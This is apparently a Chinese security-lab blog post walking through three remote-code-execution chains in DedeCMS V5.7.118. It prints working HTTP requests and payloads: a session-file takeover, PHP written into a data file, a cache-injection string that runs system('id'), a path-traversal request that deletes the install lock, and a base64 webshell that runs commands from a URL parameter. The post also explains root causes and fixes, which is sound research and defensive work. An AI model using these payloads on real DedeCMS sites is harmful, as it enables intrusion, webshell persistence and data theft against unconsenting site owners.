#  【0day预警】写进去的代码， 总有人替你执行： DedeCMS 的三个 RCE  
 YNsec安全实验室   2026-10-26 06:11  
  
[@零隐网络安全实验室](https://mp.weixin.qq.com/mp/readtemplate?t=pages/link_mid_jump&biz=MzY5MzI4MjM2NQ==)  
 点点关注，每日更新  
  
安全研究 · 漏洞利用链拆解 · 靶场实录  
  
摘要  
前两条链聊的是「怎么把代码写进去」，这一篇补上第三条，它解决的是另一个问题：写入程序现成就有，只是被一把锁挡着。  
  
三条链横跨零权限、后台账号、会员组合三种起点，最后落到同一件事——让一个会被 PHP 解析的文件出现在 web 目录里。而它们各自打穿的「防护」，全都只是名字：一个后缀、一个 .bak  
、一个锁文件。  
  
**免责声明：**  
本文所述测试全部在授权靶场环境中完成，目标地址、会话 ID 与 token 均已脱敏（使用 RFC5737 文档专用地址段）。内容仅用于安全学习与防御加固，请勿用于任何未授权测试。  
## 一、先说系统：DedeCMS 是干什么的  
  
织梦（DedeCMS）是国内用得最久的一批 PHP 建站系统之一，V5.7 这套代码从 PHP 5.2 时代一路维护下来，政企站、学校站、中小企业站里还留着一大批。本次三个靶标的版本都是 **V5.7.118 UTF8 SP2**  
。  
  
它的目录结构非常固定，记住这六层，后面所有请求都能对上号：  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">目录</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 9px 10px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">装什么</span></section></th><th style="background:#f4f7fb;border:1px solid #e3e8ef;padding:9px 10px;text-align:left;font-weight:700;color:#1f2d3d;"><section><span leaf="">与本文的关系</span></section></th></tr></thead><tbody><tr><td style="border:1px solid #e3e8ef;padding:9px 10px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 4px;font-family:Consolas,monospace;font-size:12px;"><span leaf="">/dede/</span></code></td><td style="border:1px solid #e3e8ef;padding:9px 10px;"><section><span leaf="">后台入口，每个功能一个 PHP 文件</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 10px;"><section><span leaf="">三条链的</span><strong><span leaf="">注入点</span></strong><span leaf="">都在这</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 10px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 4px;font-family:Consolas,monospace;font-size:12px;"><span leaf="">/member/</span></code></td><td style="border:1px solid #e3e8ef;padding:9px 10px;"><section><span leaf="">会员中心：注册、登录、投稿</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 10px;"><section><span leaf="">VE-0186 的引爆点、VE-0182 的入口</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 10px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 4px;font-family:Consolas,monospace;font-size:12px;"><span leaf="">/data/</span></code></td><td style="border:1px solid #e3e8ef;padding:9px 10px;"><section><span leaf="">运行时数据：缓存、session、备份、模块包</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 10px;"><section><span leaf="">VE-0034 的起点，也是三条链的落点</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 10px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 4px;font-family:Consolas,monospace;font-size:12px;"><span leaf="">/plus/</span></code></td><td style="border:1px solid #e3e8ef;padding:9px 10px;"><section><span leaf="">前台零散功能：搜索、评论、投稿</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 10px;"><section><span leaf="">—</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 10px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 4px;font-family:Consolas,monospace;font-size:12px;"><span leaf="">/include/</span></code></td><td style="border:1px solid #e3e8ef;padding:9px 10px;"><section><span leaf="">公共函数、配置读取</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 10px;"><section><span leaf="">VE-0186 的 </span><strong><span leaf="">sink</span></strong><span leaf=""> 在 </span><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 4px;font-family:Consolas,monospace;font-size:12px;"><span leaf="">config.php</span></code></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:9px 10px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 4px;font-family:Consolas,monospace;font-size:12px;"><span leaf="">/install/</span></code></td><td style="border:1px solid #e3e8ef;padding:9px 10px;"><section><span leaf="">安装程序，装完理论上该删掉，只留一个 </span><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 4px;font-family:Consolas,monospace;font-size:12px;"><span leaf="">install_lock.txt</span></code><span leaf=""> 当锁</span></section></td><td style="border:1px solid #e3e8ef;padding:9px 10px;"><section><span leaf="">VE-0182 的</span><strong><span leaf="">入口与靶心</span></strong></section></td></tr></tbody></table>  
光看目录还不够。真正决定这三条链能成立的，是它的一个设计习惯：**配置不存数据库，而是写成 PHP 文件**  
。  
  
DedeCMS 里大量「系统配置」「栏目结构」「会员模型」这类东西，最终都落在 /data/  
 下的 .inc  
 / .php  
 文件里，程序启动或渲染页面时 require  
 进来。原因很实在——PHP 5 时代读一个本地文件比查一次库快得多，而且这些配置几乎不变，编译进 opcache 之后接近零成本。  
  
代价是：**这些文件必须靠「拼字符串」生成**  
。因为要写出 $_MemberMod[1]=array('个人','dede_member_person');  
 这种结构，只能拼接。而拼接就意味着：只要有一个变量没处理好，写下去的就是**代码**  
，不是数据。  
  
💡 **为什么这一点决定了攻击面？**  
一个 CMS 里，「把用户输入存进数据库」是常规操作，「把用户输入写成 PHP 文件」是非常规操作。后者一旦出现，就等于给攻击者开了一个「用字符串拼代码」的入口。本文三条链，分别写的是 data/downmix.data.php  
、data/cache/member_model.inc  
 和 dede/ve0182_chain_webshell.php  
，都在这个入口里。  
## 二、结论速览  
  
三份报告、三台靶标、**同一个版本**  
。起点差得很远，终点一样。  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 8px 7px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">对比项</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 8px 7px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">VE-0034</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 8px 7px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">VE-0186</span></section></th><th style="background:#f4f7fb;border:1px solid #e3e8ef;padding:8px 7px;text-align:left;font-weight:700;color:#1f2d3d;"><section><span leaf="">VE-0182</span></section></th></tr></thead><tbody><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">链类型</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">零权限 · 3 步</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">需账号 · 1 步</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">会员 + 管理员 · 6 步</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">起点</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">无任何凭据</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">后台 admin</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">会员账号 + admin 备料</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">落点</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 3px;font-family:Consolas,monospace;font-size:10.5px;"><span leaf="">data/downmix.data.php</span></code></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 3px;font-family:Consolas,monospace;font-size:10.5px;"><span leaf="">data/cache/member_model.inc</span></code></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 3px;font-family:Consolas,monospace;font-size:10.5px;"><span leaf="">dede/ve0182_chain_webshell.php</span></code></td></tr><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">怎么执行</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">URL 直达</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 3px;font-family:Consolas,monospace;font-size:10.5px;"><span leaf="">require_once</span></code></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">模块安装器写盘</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">最终权限</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">www-data</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">apache（uid=48）</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">apache（uid=48）</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">打穿的「防护」</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">禁用函数黑名单</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">「.inc 不会被解析」的假设</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">安装锁 + 改名 .bak</span></section></td></tr></tbody></table>  
最后一行是我特意加的，也是这篇真正想聊的东西：**三条链打穿的防护，性质完全一样——都只是「标识」**  
。这个线头留到第六节收。  
## 三、链一 VE-0034：从「能看目录」到「能执行命令」  
  
这条链最值得玩味的地方是：它前面两步严格来说不叫漏洞，叫**默认配置**  
。  
### 3.1 第一步：/data/ 把家底摊开  
  
Apache 开着 Options +Indexes  
，而 /data/  
 下没有 index 文件，于是整个目录列表就被直接吐了出来：  
  
HTTP 请求  
  
  
GET /data/ HTTP/1.1  
  
Host: 192.0.2.10:8080  
  
User-Agent: Mozilla/5.0  
  
  
响应（关键片段）  
  
  
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td>  
  
    <td><a href="sessions_7ac070552e/">sessions_7ac070552e/</a></td></tr>  
  
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td>  
  
    <td><a href="sessions_72285f68ba/">sessions_72285f68ba/</a></td></tr>  
  
  
两个 sessions_*  
 目录，就是 PHP 的 session 存储路径；顺带还暴露了 backupdata/  
、cache/  
。这一步没拿到任何权限，但攻击者已经知道弹药在哪了。  
### 3.2 第二步：session 文件是明文文本  
  
这是整条链最关键、也最容易被忽略的一步：**PHP 的 session 文件不是二进制，是纯文本**  
，格式固定为「键名 | 序列化值 ;」。它没有 .php  
 后缀，Apache 不会把它交给 PHP 解析，直接以 text/plain 返回原文：  
  
HTTP 请求  
  
  
GET /data/sessions_72285f68ba/sess_k3m9q7d2pl0vhb1n8s4tfj6ura HTTP/1.1  
  
Host: 192.0.2.10:8080  
  
  
响应  
  
  
last_time|i:1784276202;  
  
dede_admin_id|s:1:"1";  
  
dede_admin_type|s:2:"10";  
  
dede_admin_channel|s:1:"0";  
  
dede_admin_name|s:5:"admin";  
  
dede_admin_purview|s:15:"admin_AllowAll ";  
  
dede_admin_style|s:7:"dedecms";  
  
token|s:32:"a1b2c3d4e5f60718293a4b5c6d7e8f90";  
  
  
一眼能读出四件事：管理员 ID 是 1、类型 10（超级管理员）、权限是 admin_AllowAll  
（全放行）、以及这个会话当前的 CSRF token。  
  
注意一个容易被忽略的前提：**攻击者根本不需要知道密码**  
。他要的只是「管理员曾经登录过，且那个 session 还没过期」——而 session 文件长期躺在 web 目录里，等于一把没有设回收时间的钥匙。  
  
⚠️ **这一步不是 DedeCMS 的 bug。**  
它是两件「单独看都不算错」的事叠出来的：PHP session 默认就是明文文件，而站点又把 session 目录放在了 web 根下。两件事各自合理，合起来就是凭据泄露。  
### 3.3 第三步：拿着别人的会话，去写自己的文件  
  
/dede/article_string_mix.php  
 是「文章来源混合」功能——把多篇文章的来源信息合并成一段，落到 data/downmix.data.php  
。它需要 admin 会话和配套 token，而这两样刚刚都到手了：  
  
先取当前 token  
  
  
GET /dede/article_string_mix.php HTTP/1.1  
  
Host: 192.0.2.10:8080  
  
Cookie: PHPSESSID=k3m9q7d2pl0vhb1n8s4tfj6ura  
  
  
写入 payload  
  
  
POST /dede/article_string_mix.php?dopost=save HTTP/1.1  
  
Host: 192.0.2.10:8080  
  
Cookie: PHPSESSID=k3m9q7d2pl0vhb1n8s4tfj6ura  
  
Content-Type: application/x-www-form-urlencoded  
  
  
dopost=save&token=<取到的 token>&allsource=%3C%3Fphp+echo+%27RCE_idQKonzx%27%3B+readfile%28%27%2Fetc%2Fhostname%27%29%3B+%3F%3E  
  
  
allsource  
 解码之后，就是一行最朴素的 PHP：  
  
实际写入的内容  
  
  
<?php echo 'RCE_idQKonzx'; readfile('/etc/hostname'); ?>  
  
  
它被原样写进 data/downmix.data.php  
。**后缀是 .php，位置在 web 根目录下**  
——这两点直接决定了下一步。  
### 3.4 第四步：访问即执行  
  
HTTP 请求  
  
  
GET /data/downmix.data.php HTTP/1.1  
  
Host: 192.0.2.10:8080  
  
  
响应  
  
  
RCE_idQKonzx7e3ce13f5905  
  
  
前半段是 echo 出来的标记，后半段是 /etc/hostname  
 的真实内容；换成 readfile('/etc/passwd')  
 就吐出整份用户表。到这里，攻击者从「一个 Cookie 都没有」走到了「www-data 权限执行任意代码」。  
  
假阳性也排查过：用三个互不相同的随机标记分别写入、分别验证，全部在响应里命中，且响应中没有出现原始的 <?php  
 文本——证明是 PHP 引擎在执行，而不是文件被当纯文本读了出来。  
### 3.5 顺带说一句：黑名单为什么拦不住  
  
这个写入点是有一道「禁用函数检测」的，报告把它归为「过滤绕过」。我不打算复述那套正则的细节，因为更有价值的结论在另一层。  
  
这类检测的本质是**黑名单**  
，而黑名单在 PHP 里几乎不可能列全。读文件这条路，除了 readfile  
，还有 file_get_contents  
、highlight_file  
、show_source  
、include  
；执行命令这条路，除了第一梯队的 system  
、exec  
、shell_exec  
，还有 popen  
、proc_open  
、passthru  
、反引号。堵掉三个，攻击者换第四个就行。  
  
更要紧的是，这道检测判断的是「文本里有没有某些词」，而不是「这段文本会不会变成代码」。前者是字符串匹配，后者是语法分析——前者永远可以被绕过，后者才可能真的拦住。修复建议里提到的 token_get_all()  
 就是这个思路：先按 PHP 语法把内容切开，再判断有没有函数调用，而不是拿正则去猜。  
## 四、链二 VE-0186：后台埋雷，前台引爆  
  
这条链只有一步，但它藏着一个比上一条更普遍的问题。所以先不看请求，先看两行代码。  
### 4.1 一个字段，穿过两个语言  
  
注入点在后台「会员模型管理」，代码把 $table  
 直接拼进了 SQL：  
  
member_model_add.php:55  
  
  
$query = "INSERT INTO #@__member_model  
  
          (`id`,`name`,`table`,`description`,`issystem`,`state`)  
  
          VALUES ('$id','$name','$table','$description',0,'$state')";  
  
$dsql->ExecNoneQuery($query);  
  
UpDateMemberModCache();  
  
  
紧接着 UpDateMemberModCache()  
 会把这个模型重新写进缓存文件，位置在 config.php:248  
：  
  
config.php:248（sink）  
  
  
fwrite($fp1,"\$_MemberMod[{$row->id}]=array('{$row->name}','{$row->table}');\r\n");  
  
  
把这两段放在一起看，问题的形状就出来了：$table  
 这个值，**先从 HTTP 进来，穿过 SQL，最后落进 PHP 代码**  
。中间跨了两个语言上下文。  
  
SQL 那一层其实是做了转义的——所以引号能安全入库、读出来还是原样。但**SQL 的转义只对 SQL 有意义**  
：反斜杠在 MySQL 眼里是转义符，在 PHP 眼里只是一个普通字符。等到 fwrite  
 往 PHP 代码里拼的时候，需要的是「PHP 字符串上下文」的转义，而这里一次都没做。  
  
🔑 **这一节最该记住的一句：**  
转义不是「安全动作」，是「针对某种语法的动作」。上下文换一次，之前那次转义就等于没做。一个字符串跨两个语言，就要转义两次——少一次，前面那次白做。  
### 4.2 塞进去的东西长什么样  
  
提交时 table  
 字段的值是：  
  
payload（table 字段）  
  
  
x',1);system('id');//  
  
  
它被存进数据库，然后在生成缓存时原样落进了文件：  
  
生成的 data/cache/member_model.inc  
  
  
<?php  
  
global $_MemberMod;  
  
$_MemberMod=array();  
  
$_MemberMod[1]=array('个人','dede_member_person');  
  
$_MemberMod[2]=array('企业','dede_member_company');  
  
$_MemberMod[8888]=array('chain_oqlmdp','x',1);system('id');//');  
  
?>  
  
  
PHP 解析这个文件时，发生了三件事：  
1. $_MemberMod[8888]=array('chain_oqlmdp','x',1);  
 —— 一条合法的数组赋值，语法完全正确，不报错；  
  
1. system('id');  
 —— 一条独立语句，就这么执行了；  
  
1. //');  
 —— 注释符把尾部多出来的 ');  
 吃掉，整个文件依然是合法 PHP。  
  
一个 payload 干三件事：**闭合字符串、插入语句、注释残骸**  
。这个「闭合 + 执行 + 注释」的三段式，是所有代码注入的通用骨架——不管注入的是 SQL、PHP 还是模板引擎，形状都一样。  
### 4.3 引爆点在前台  
  
.inc  
 后缀意味着这个文件不能像上一条链那样直接 URL 访问（Apache 不会把 .inc 交给 PHP 解析）。但 DedeCMS 自己会去包含它——会员注册页的模板里就是这么一行：  
  
reg-new.htm:112  
  
  
require_once DEDEDATA.'/cache/member_model.inc';  
  
  
于是引爆只需要一个匿名 GET：  
  
HTTP 请求（零权限）  
  
  
GET /member/index_do.php?fmdo=user&dopost=regnew HTTP/1.1  
  
Host: 192.0.2.20:8080  
  
  
响应里就带着 uid=48(apache) gid=48(apache) groups=48(apache)  
。  
  
注意这个结构：**注入需要管理员，引爆不需要**  
。而且缓存文件是持久的——注入一次之后，只要文件不被重建，之后的每一个访客都在替你触发。报告专门验证了这一点：把 Cookie、Token 全部清空再访问，RCE 依然成立。  
### 4.4 一个「失败」的细节，反而最有用  
  
验证时第一次用的是 system('echo VE0186_CHAIN_TEST_oekxfxze')  
，但回显只有 VE0186_CHAI  
——被截断了。原因很朴素：table  
 是数据库字段，有长度上限，payload 超了就被切掉。  
  
这个细节值得单独说，因为它是实战里最常见、也最容易误判的情况：**payload 有长度预算**  
。写入类漏洞尤其如此——数据库字段长度、文件写入上限、正则匹配长度，随便哪个都可能把你精心构造的语句截成半句。看到「回显不全」先别怀疑没打通，先量一下长度。  
## 五、链三 VE-0182：先删锁，再开门  
  
前两条链都在解决「怎么把代码写进去」。这一条解决的是另一个问题：**写入程序现成就有，只是被一把锁挡着**  
。  
  
DedeCMS 装完之后，/install/  
 目录理论上该删掉。留着没删的站点，靠一个 install_lock.txt  
 兜底：安装程序一进来先 file_exists()  
，发现有锁就退出。而 module-install.php  
 本身**不做任何认证**  
——所以这把锁，是唯一的屏障。  
  
于是这条链的全部工作量，就变成了：**想办法让那个文件消失**  
。  
### 5.1 一个会员，三次跳转，删掉一个文件  
  
报告里这一步改写过：早期方案是用后台文件管理器删锁（需要管理员），后来换成了一条纯会员侧的路。三步，每一步单独看都很「正常」：  
1. **VE-0064 · 绕过验证码登录会员**  
——拿到一个普通会员会话。不是提权，就是正常会员。  
  
1. **VE-0125 · 发一篇文章**  
——正文里塞一个 <img>  
，src 指向一个路径穿越的地址。  
  
1. **VE-0201 · 把这篇文章删掉**  
——删文时程序会清理正文里的媒体文件，于是 unlink  
 落到了安装锁上。  
  
发文时塞进去的正文是这样：  
  
发文（VE-0125）  
  
  
POST /member/archives_add.php HTTP/1.1  
  
Host: 192.0.2.30:8080  
  
Cookie: <会员会话>  
  
Content-Type: application/x-www-form-urlencoded  
  
  
dopost=save&channelid=1&typeid=1&title=ve0182-lock-del  
  
&body=%3Cimg+src%3D%22%2Fuploads%2F..%2Finstall%2Finstall_lock.txt%22+%2F%3E  
  
  
删文就是一次很普通的会员操作：  
  
删文（VE-0201）  
  
  
GET /member/archives_do.php?dopost=delArc&aid=<上一步拿到的 aid> HTTP/1.1  
  
Host: 192.0.2.30:8080  
  
Cookie: <会员会话>  
  
  
关键的几行在 member/inc/inc_batchup.php  
 里。它做的事非常简单：从正文里用正则抓出所有以 /uploads  
 开头的路径，前面拼上站点根目录，然后删掉。  
  
DelArc 的清理逻辑  
  
  
// 1. 用正则从正文里提媒体路径（前缀必须是 /uploads）  
  
preg_match_all('/(\/uploads.+?)(\"| )/', $body, $m);  
  
$var    = $m[1][0];        // /uploads/../install/install_lock.txt  
  
  
// 2. 拼上站点根目录，不做任何规范化  
  
$upname = DEDEROOT . $var; // /var/www/html/uploads/../install/install_lock.txt  
  
  
// 3. 删  
  
@unlink($upname);          // 内核把 .. 解析掉 → 删的是 install/install_lock.txt  
  
  
三步都对得上：正则要求以 /uploads  
 开头（所以 payload 必须以它打头），拼接时不过滤 ..  
，而 unlink  
 在文件系统层面完全接受 ..  
——它只负责删，不负责判断「这个文件该不该被删」。  
  
💡 **这条链最反直觉的地方：**  
「发一篇文章」和「删掉安装锁」之间隔了三个功能模块，中间只有一条正则相连。当一个程序**从用户内容里提取路径、再拿去操作文件系统**  
，路径穿越就已经在门口了——因为内容和文件系统之间，只隔着一次字符串拼接。  
### 5.2 门本来就开着  
  
锁一没，剩下的流程就是安装程序的正常逻辑。它第一件事还是查锁，查到没有就继续往下走，读 /install/modules.tmp.inc  
 拿「要装哪个模块」：  
  
install/modules.tmp.inc  
  
  
<?php  
  
$selModule = "poc_chain_001";  
  
$allmodules = array();  
  
$allmodules["poc_chain_001"] = "poc_chain_001.xml";  
  
?>  
  
  
然后去 /data/module/  
 下解析同名 XML。模块包里每个文件都是 base64 编码的内容——这本来是给「分发插件」设计的，正好也是一个理想的 webshell 载体：  
  
data/module/poc_chain_001.xml  
  
  
<?xml version="1.0" encoding="utf-8"?>  
  
<module>  
  
<baseinfo>  
  
name=POC_Chain_001  
  
hash=poc_chain_001  
  
lang=utf-8  
  
</baseinfo>  
  
<modulefiles>  
  
<file type="file" name="ve0182_chain_webshell.php">  
  
PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pg==  
  
</file>  
  
</modulefiles>  
  
</module>  
  
  
那串 base64 解码之后，是七个字符就能干活的一行：<?php system($_REQUEST['cmd']); ?>  
。中间那行 lang=utf-8  
 不是凑数的，5.3 会讲它为什么能决定成败。  
  
引爆只需要一个 GET，**不带任何 Cookie**  
：  
  
触发（VE-0182 核心）  
  
  
GET /install/module-install.php.bak?step=0 HTTP/1.1  
  
Host: 192.0.2.30:8080  
  
  
它会一路走到 DedeModule::WriteFiles()  
，把 XML 里的 base64 解开、写到 /dede/ve0182_chain_webshell.php  
。然后：  
  
RCE 验证  
  
  
GET /dede/ve0182_chain_webshell.php?cmd=id  
  
→ uid=48(apache) gid=48(apache) groups=48(apache)  
  
  
GET /dede/ve0182_chain_webshell.php?cmd=pwd  
  
→ /var/www/html/dede  
  
  
假阳性用唯一标记 FP_1784283838_23143  
 验过一遍：先 echo  
 进 /tmp  
，再 cat  
 回来，标记精确一致。  
### 5.3 两个细节，都是「框架自己的坑」  
  
**第一个：.bak 为什么还能当 PHP 跑。**  
把危险文件改名加个 .bak  
，是运维里最常见的「先临时下线」手法。但 Apache 决定一个文件要不要交给 PHP，看的是 AddHandler  
 / AddType  
 的匹配规则，而 module-install.php.bak  
 这个名字里还带着 .php  
——只要服务器配了多后缀解析，它照样被当 PHP 执行。**你以为改名等于关掉，实际上只改了个大家看得见的名字。**  
  
**第二个：lang=utf-8 这行决定 webshell 内容对不对。**  
不写它，DedeModule  
 会认为模块是 gbk 编码，走上转码分支，而那个分支里一次 preg_match  
 会把待写内容 $ct  
 覆盖掉，于是文件写成功了，内容却变成单个字符 1  
。  
  
这类失败最难 debug：请求 200、文件真的生成了、文件名完全正确，就是访问没反应。所以实战里遇到「明明写进去了却不执行」，先别怀疑权限或解析，**把写出来的文件读回来，看看内容到底是什么**  
。  
### 5.4 这条链的断点，报告自己说得很清楚  
  
报告开头的链信息把类型标成「前台/零权限」，但结尾的专项收口写的是**「未达成零权限 RCE」**  
。我更喜欢后面那个结论，因为它诚实：删锁这一环确实做到了会员侧，可还剩两件事得由管理员做——写 modules.tmp.inc  
、上传模块 XML。  
  
所以更准确的描述是：**入口无认证，但前置要备料**  
。认证绕过绕掉的是「触发那一刻的认证」，不是「准备阶段的那道门」。这个区别很实用——它决定了这条链的用法：不是拿来从互联网裸打，而是「已经有后台权限、却被安装锁挡住」时的补刀；同时也是在验证一件事，**安装锁到底算不算一道边界**  
。  
  
它给出的答案很干脆：不算。一把锁如果只是一次 file_exists()  
 判断，那么任何能让文件消失的手段都能开锁——哪怕那个手段来自一个普通会员的「删文章」按钮。  
## 六、三条链摆在一起：三种引信，一种病根  
<table><thead><tr><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 8px 7px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">对比项</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 8px 7px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">VE-0034</span></section></th><th style="background: rgb(244, 247, 251);border: 1px solid rgb(227, 232, 239);padding: 8px 7px;text-align: left;font-weight: 700;color: rgb(31, 45, 61);"><section><span leaf="">VE-0186</span></section></th><th style="background:#f4f7fb;border:1px solid #e3e8ef;padding:8px 7px;text-align:left;font-weight:700;color:#1f2d3d;"><section><span leaf="">VE-0182</span></section></th></tr></thead><tbody><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">写进哪里</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">web 根下 </span><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 3px;font-family:Consolas,monospace;font-size:10.5px;"><span leaf="">/data/</span></code></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">web 根下 </span><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 3px;font-family:Consolas,monospace;font-size:10.5px;"><span leaf="">/data/cache/</span></code></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">web 根下 </span><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 3px;font-family:Consolas,monospace;font-size:10.5px;"><span leaf="">/dede/</span></code></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">文件后缀</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 3px;font-family:Consolas,monospace;font-size:10.5px;"><span leaf="">.php</span></code></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 3px;font-family:Consolas,monospace;font-size:10.5px;"><span leaf="">.inc</span></code></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 3px;font-family:Consolas,monospace;font-size:10.5px;"><span leaf="">.php</span></code><section><span leaf="">（安装器自己写的）</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">谁把它变成代码</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">URL 直达</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">会员注册页 </span><code style="background:#f0f3f7;color:#c7254e;border-radius:3px;padding:1px 3px;font-family:Consolas,monospace;font-size:10.5px;"><span leaf="">require_once</span></code></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">模块安装器写盘，之后 URL 直达</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">注入端要什么</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">一个没过期的 admin 会话</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">admin + c_New 权限</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">会员账号 + admin 备料</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">引爆端要什么</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">什么都不要</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">什么都不要</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">什么都不要</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">持久性</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">文件在就一直能用</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">缓存不重建就一直能用</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">webshell 在就一直能用</span></section></td></tr><tr><td style="border:1px solid #e3e8ef;padding:8px 7px;font-weight:600;"><section><span leaf="">打穿了什么</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">禁用函数黑名单</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">「.inc 不会被解析」的假设</span></section></td><td style="border:1px solid #e3e8ef;padding:8px 7px;"><section><span leaf="">安装锁 + 改名 .bak</span></section></td></tr></tbody></table>  
